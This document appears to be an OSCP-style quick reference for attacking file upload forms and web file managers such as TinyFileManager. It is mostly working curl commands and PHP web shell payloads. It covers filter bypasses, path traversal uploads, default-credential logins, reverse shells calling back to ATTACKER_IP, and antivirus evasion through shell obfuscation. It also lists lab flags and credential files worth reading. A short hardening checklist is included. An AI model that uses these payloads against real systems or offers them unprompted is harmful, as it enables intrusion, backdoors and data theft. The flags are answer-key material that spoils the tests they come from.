# File Upload & File Manager Exploitation Quick Reference

## Table of Contents
1. [Discovery & Enumeration](#discovery--enumeration)
2. [File Upload Attack Vectors](#file-upload-attack-vectors)
3. [File Manager Exploitation](#file-manager-exploitation)
4. [Attack Chains](#attack-chains)
5. [OS-Specific Considerations](#os-specific-considerations)
6. [Troubleshooting](#troubleshooting)
7. [Tools & References](#tools--references)

---

## Discovery & Enumeration

### Identifying File Upload Functionality

#### Visual Indicators
```
- "Upload", "Choose File", "Browse" buttons
- Forms with enctype="multipart/form-data"
- Career/Jobs sections (resume uploads)
- Profile/Avatar sections
- Content management areas
- Blog post attachments
- Support ticket systems
```

#### HTML Source Code Signs
```html
<!-- Look for these patterns -->
<input type="file" name="upload">
<form enctype="multipart/form-data">
<input type="submit" value="Upload">
```

#### Common Upload Endpoints
```
/upload.php
/uploads/
/media/
/files/
/attachments/
/assets/
/images/
/documents/
/tmp/
/temp/
```

### Identifying File Managers

#### Common File Manager Applications
```
TinyFileManager    - index.php, tinyfilemanager.php
Elfinder         - elfinder.html, connector.php
KCFinder         - browse.php
CKFinder         - ckfinder.html
ResponsiveFilemanager - filemanager/
FileGator        - filegator.php
Monsta FTP       - mftp.php
```

#### Detection Methods
```bash
# Check for common file managers
curl -I "http://TARGET/tinyfilemanager.php"
curl -I "http://TARGET/filemanager/"
curl -I "http://TARGET/elfinder/elfinder.html"

# Look for version information
curl -s "http://TARGET/index.php" | grep -i "tinyfilemanager\|elfinder\|filemanager"

# Check robots.txt
curl -s "http://TARGET/robots.txt" | grep -i "admin\|upload\|file"

# Directory enumeration
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php,html
```

### Fingerprinting File Managers

#### TinyFileManager Detection
```bash
# Version 2.4.3 and below vulnerable to CVE-2021-45010
curl -s "http://TARGET/" | grep "data-version=\"2.4"

# Check default credentials
admin:admin@123
user:12345
```

#### Version Identification
```bash
# Check headers
curl -I "http://TARGET/index.php" | grep -i "x-powered-by"

# Check source comments
curl -s "http://TARGET/" | grep -i "version\|v[0-9]"
```

---

## File Upload Attack Vectors

### 1. Basic File Upload Bypass

#### Extension Manipulation
```bash
# Case variations (Windows)
file.php → file.pHP, file.Php, file.PHP

# Alternative PHP extensions
.php3, .php4, .php5, .php7, .phtml, .phps

# Double extensions
shell.php.txt → rename later
shell.php.jpg
shell.jpg.php

# Null byte (older PHP)
shell.php%00.jpg
shell.php\x00.jpg

# Special characters
shell.php......
shell.php%20
shell.php.
```

#### MIME Type Bypass
```bash
# Change Content-Type header
Content-Type: image/jpeg  # Instead of application/x-php

# Using curl
curl -X POST -H "Content-Type: image/jpeg" \
  -F "file=@shell.php;type=image/jpeg" \
  "http://TARGET/upload.php"
```

#### Content-Based Bypass
```bash
# Add image magic bytes to PHP file
echo -e "\xFF\xD8\xFF\xE0<?php system(\$_GET['cmd']); ?>" > shell.php.jpg

# GIF header
echo -e "GIF89a<?php system(\$_GET['cmd']); ?>" > shell.php

# PNG header
echo -e "\x89PNG\r\n\x1a\n<?php system(\$_GET['cmd']); ?>" > shell.php
```

### 2. Path Traversal in Upload

```bash
# During upload, manipulate path parameter
filename="../shell.php"
filename="../../shell.php"
filename="../../../var/www/html/shell.php"

# URL encoded
filename="..%2Fshell.php"
filename="..%252Fshell.php"  # Double encoded

# Using curl
curl -X POST -F "file=@shell.php" \
  -F "path=../" \
  -F "filename=../shell.php" \
  "http://TARGET/upload.php"
```

### 3. Race Condition Exploitation

```bash
# Upload and access quickly before deletion
while true; do
  curl -X POST -F "file=@shell.php" "http://TARGET/upload.php" &
  curl "http://TARGET/uploads/shell.php?cmd=id"
done
```

### 4. Zip/Archive Upload

```bash
# Create malicious archive
echo '<?php system($_GET["cmd"]); ?>' > shell.php
zip payload.zip shell.php

# Upload and extract
# Some applications auto-extract archives
```

---

## File Manager Exploitation

### TinyFileManager Specific (CVE-2021-45010)

#### Authentication
```bash
# Login with default creds
curl -c cookies.txt -X POST \
  -d "fm_usr=admin&fm_pwd=admin@123" \
  "http://TARGET/index.php"

# Common default passwords
admin:admin@123
admin:admin
user:12345
```

#### Path Traversal Upload
```bash
# Upload with path manipulation
curl -b cookies.txt -X POST \
  -F "file=@shell.php" \
  -F "fullpath=../shell.php" \
  "http://TARGET/index.php?p=&upload"

# Alternative path parameters
-F "path=../"
-F "destination=../../"
```

#### File Edit Exploitation
```bash
# Edit existing PHP file
curl -b cookies.txt -X POST \
  -d "savedata=<?php system(\$_GET['x']);?>" \
  "http://TARGET/index.php?p=&edit=index.php&save=1"

# Create new PHP file
curl -b cookies.txt -X POST \
  -d "type=file&name=shell.php&content=<?php system(\$_GET['cmd']);?>" \
  "http://TARGET/index.php?p=&new=file"
```

#### Command Execution
```bash
# Via uploaded shell
curl "http://TARGET/shell.php?cmd=whoami"

# Via edited file
curl "http://TARGET/index.php?x=id"

# Via included file
curl "http://TARGET/index.php?p=shell.php&cmd=ls"
```

### Other File Managers

#### elFinder Exploitation
```bash
# Command injection in archive names
touch "a;id;b.tar"
tar -cf "a;id;b.tar" shell.php

# Upload and trigger extraction
```

#### CKFinder
```bash
# Default upload directory
/userfiles/
/ckfinder/userfiles/

# Common vulnerable versions
CKFinder 2.x - arbitrary file upload
CKFinder 3.x < 3.5.1.1 - XML injection
```

---

## Attack Chains

### Linux Target Chain

```bash
# 1. Discovery
gobuster dir -u http://TARGET -w /usr/share/wordlists/dirb/common.txt -x php

# 2. Identify upload mechanism
curl -s "http://TARGET/" | grep -i "upload\|file"

# 3. Test basic upload
echo "test" > test.txt
curl -X POST -F "file=@test.txt" "http://TARGET/upload.php"

# 4. Test PHP upload (will likely fail)
cp /usr/share/webshells/php/simple-backdoor.php shell.php
curl -X POST -F "file=@shell.php" "http://TARGET/upload.php"

# 5. Bypass filter
mv shell.php shell.pHP  # Case manipulation
curl -X POST -F "file=@shell.pHP" "http://TARGET/upload.php"

# 6. Access shell
curl "http://TARGET/uploads/shell.pHP?cmd=id"

# 7. Get reverse shell
# Listener
nc -nvlp 4444

# Trigger
curl "http://TARGET/uploads/shell.pHP?cmd=bash%20-c%20'bash%20-i%20>%26%20/dev/tcp/ATTACKER_IP/4444%200>%261'"
```

### Windows Target Chain

```bash
# 1. Identify Windows/IIS/XAMPP
curl -I "http://TARGET" | grep -i "server:"

# 2. Create PHP shell
echo '<?php system($_GET["cmd"]); ?>' > shell.php

# 3. Bypass using case
mv shell.php shell.pHP

# 4. Upload
curl -X POST -F "file=@shell.pHP" "http://TARGET/upload.php"

# 5. Execute commands
curl "http://TARGET/uploads/shell.pHP?cmd=dir"
curl "http://TARGET/uploads/shell.pHP?cmd=type%20C:\\Windows\\System32\\drivers\\etc\\hosts"

# 6. PowerShell reverse shell
# Encode payload
$text = '$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);...'
$bytes = [System.Text.Encoding]::Unicode.GetBytes($text)
$encoded = [Convert]::ToBase64String($bytes)

# Execute
curl "http://TARGET/uploads/shell.pHP?cmd=powershell%20-enc%20BASE64_PAYLOAD"
```

### File Manager Chain

```bash
# 1. Identify file manager
curl -s "http://TARGET/" | grep -i "filemanager\|tinyfilemanager"

# 2. Try default creds
admin:admin@123
admin:admin
root:root
user:12345

# 3. Login
curl -c cookies.txt -X POST \
  -d "fm_usr=admin&fm_pwd=admin@123" \
  "http://TARGET/index.php"

# 4. Upload with path traversal
curl -b cookies.txt -X POST \
  -F "file=@shell.php" \
  -F "fullpath=../../../shell.php" \
  "http://TARGET/index.php?p=&upload"

# 5. If upload fails, edit existing file
curl -b cookies.txt -X POST \
  -d "savedata=<?php if(isset(\$_GET['x']))system(\$_GET['x']);?>" \
  "http://TARGET/index.php?p=&edit=index.php&save=1"

# 6. Execute
curl "http://TARGET/index.php?x=cat%20/etc/passwd"
```

---

## OS-Specific Considerations

### Windows Specifics

```bash
# Case-insensitive filesystem
file.php = file.PHP = file.PhP

# Path separators
C:\xampp\htdocs\uploads\
C:/xampp/htdocs/uploads/  # Also works

# Common web roots
C:\inetpub\wwwroot\        # IIS
C:\xampp\htdocs\           # XAMPP
C:\wamp\www\               # WAMP
C:\Program Files\Apache\htdocs\  # Apache

# Command execution
cmd.exe /c dir
powershell.exe -c "Get-Process"

# File locations of interest
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\logs\LogFiles\
C:\xampp\passwords.txt
C:\xampp\mysql\data\
```

### Linux Specifics

```bash
# Case-sensitive filesystem
file.php ≠ file.PHP

# Common web roots
/var/www/html/
/var/www/
/usr/share/nginx/html/
/opt/lampp/htdocs/
/home/user/public_html/

# Command execution
/bin/bash -c "id"
/bin/sh -c "whoami"

# File locations of interest
/etc/passwd
/etc/shadow (if root)
/var/log/apache2/access.log
/home/*/.ssh/authorized_keys
/opt/flags/
/root/.bash_history
```

---

## Troubleshooting

### Upload Issues

| Problem | Solution |
|---------|----------|
| **"File type not allowed"** | Try case manipulation (.pHP), alternative extensions (.php5), double extensions (.php.txt) |
| **"Upload failed"** | Check file size limits, try smaller payload |
| **Upload succeeds but can't find file** | Check alternative directories (/uploads/, /tmp/, /files/, /media/) |
| **PHP not executing** | Check if .htaccess blocks execution, try different directory |
| **403 Forbidden on uploaded file** | Check permissions, try chmod via shell if possible |
| **Connection timeout** | Firewall may block outbound, try bind shell instead |
| **Spaces in Windows paths failing** | URL encode (%20) or use quotes in commands |

### File Manager Issues

| Problem | Solution |
|---------|----------|
| **Login fails with correct creds** | Check if Burp proxy causes issues, disable it |
| **Session expires quickly** | Keep refreshing session with requests |
| **Upload with path traversal fails** | Try editing existing files instead |
| **Can't find uploaded file** | Check current working directory in file manager |
| **Edit function disabled** | Try create new file function |
| **Commands not executing** | Check PHP functions aren't disabled (system, exec, passthru) |

### Detection Bypass

```bash
# If WAF blocks uploads
- Use chunked transfer encoding
- Try PUT method instead of POST
- Change User-Agent header
- Use different Content-Type

# If antivirus detects shell
- Obfuscate PHP code
- Split payload across multiple files
- Use alternative execution methods (eval, assert)
- Base64 encode payload

# Example obfuscation
<?php $a="sys"."tem"; $a($_GET['x']); ?>
<?php $func=str_rot13('flfgrz');$func($_GET['x']); ?>
```

---

## Tools & References

### Webshells
```bash
# Kali locations
/usr/share/webshells/php/simple-backdoor.php
/usr/share/webshells/php/php-reverse-shell.php
/usr/share/webshells/aspx/
/usr/share/webshells/jsp/

# Popular webshells
- p0wny-shell
- b374k shell
- c99 shell
- r57 shell
- WSO shell
```

### Upload Bypass Tools
```bash
# Upload bypass checklist
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Upload%20Insecure%20Files

# Automatic bypass testing
python3 fuxploider.py --url http://TARGET/upload.php

# Extension fuzzing
upload-fuzz-extensions.txt
```

### File Manager Exploits
```bash
# CVE-2021-45010 (TinyFileManager <= 2.4.3)
https://github.com/febinrev/tinyfilemanager-2.4.3-exploit

# CVE-2021-40964 (TinyFileManager 2.4.6)
https://www.exploit-db.com/exploits/50828

# General file manager scanner
python3 filemanager-scanner.py -u http://TARGET
```

### Detection & Prevention
```bash
# File upload security checklist
- Whitelist extensions (not blacklist)
- Check file content, not just extension
- Store uploads outside web root
- Generate random filenames
- Scan with antivirus
- Set proper permissions (644)
- Disable PHP execution in upload directories

# .htaccess for upload directory
<FilesMatch "\.php$">
    Order Deny,Allow
    Deny from all
</FilesMatch>
```

### Quick Commands Reference
```bash
# Test upload
curl -X POST -F "file=@test.txt" "http://TARGET/upload.php"

# Upload with specific content-type
curl -X POST -H "Content-Type: image/jpeg" -F "file=@shell.php;type=image/jpeg" "http://TARGET/upload.php"

# Login to file manager
curl -c cookies.txt -d "fm_usr=admin&fm_pwd=admin@123" "http://TARGET/index.php"

# Upload with cookies
curl -b cookies.txt -F "file=@shell.php" "http://TARGET/upload.php"

# Execute command
curl "http://TARGET/shell.php?cmd=id"

# URL encode special chars
space = %20
& = %26
| = %7C
> = %3E
< = %3C
```

---

## Real-World Examples from Labs

### Mountain Desserts XAMPP (Windows)
```bash
# Vulnerability: Case-sensitive filter on case-insensitive OS
# Bypass: .php → .pHP
# Target: C:\xampp\passwords.txt
# Flag: OS{6fa366380b7b5209f5cab0897ee3c05f}
```

### TinyFileManager 2.4.3
```bash
# Vulnerability: Path traversal + file edit capability
# Bypass: Edit index.php directly
# Target: /opt/install.txt
# Flag: OS{d9ecaac3223ae983366a261ab961d489}
```

---

## OSCP Exam Notes

1. **Always test simple uploads first** - Sometimes there's no filter
2. **Try multiple bypass techniques** - Don't give up after first failure
3. **Check for file managers** - Often have weak/default credentials
4. **Document all attempts** - Include failed attempts in report
5. **Consider time** - If stuck for 30+ mins, try different vector
6. **Windows vs Linux** - Adjust techniques based on OS
7. **Check for existing uploads** - Previous users may have left shells
8. **Alternative access** - If upload fails, try LFI/RFI to include uploaded files